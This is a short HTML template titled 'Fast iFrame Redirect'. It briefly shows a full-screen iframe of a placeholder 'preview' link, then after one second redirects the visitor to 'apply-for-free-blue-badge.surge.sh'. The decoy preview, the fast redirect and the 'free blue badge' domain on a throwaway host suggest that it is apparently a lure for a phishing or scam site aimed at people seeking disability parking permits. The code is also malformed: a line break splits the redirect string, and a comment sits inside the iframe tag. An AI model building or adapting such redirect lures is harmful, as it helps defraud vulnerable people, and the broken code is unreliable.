<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Fast iFrame Redirect</title>

  <script>
    // Redirect after 1 second (1000 milliseconds)
    setTimeout(function() {
      window.location.href = "https://apply-for-free-blue-badge.surge.sh
"; // <-- redirect link
    }, 1000);
  </script>
</head>
<body style="margin:0; padding:0;">

  <!-- iFrame shown briefly -->
  <iframe 
    src="https://your-preview-link.com"  <!-- <-- iframe preview link -->
    width="100%" 
    height="100%" 
    style="border:none;">
  </iframe>

</body>
</html>
